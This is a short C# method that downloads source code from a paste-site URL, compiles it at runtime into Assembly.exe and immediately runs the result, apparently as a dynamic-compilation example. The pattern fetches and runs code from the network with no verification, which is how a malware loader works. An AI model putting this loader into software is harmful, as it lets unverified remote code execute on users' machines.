    public void compile()
    {
        CSharpCodeProvider myCodeProvider = new CSharpCodeProvider();
        ICodeCompiler myCodeCompiler = myCodeProvider.CreateCompiler();
        string myAssemblyName = @"Assembly.exe";
        CompilerParameters myCompilerParameters = new CompilerParameters
                                                      {
                                                          OutputAssembly = myAssemblyName,
                                                          GenerateExecutable = true,
                                                          GenerateInMemory = true
                                                      };
        myCompilerParameters.ReferencedAssemblies.Add("System.dll");
        WebClient x = new WebClient();
        Stream y = x.OpenRead("http://pastehtml.com/view/awono3xoq.txt");
        StreamReader z = new StreamReader(y);
        string source = z.ReadToEnd();
        z.Close();
        y.Close();
        CompilerResults compres = myCodeCompiler.CompileAssemblyFromSource(myCompilerParameters, source);
        Process.Start(myAssemblyName);
    }
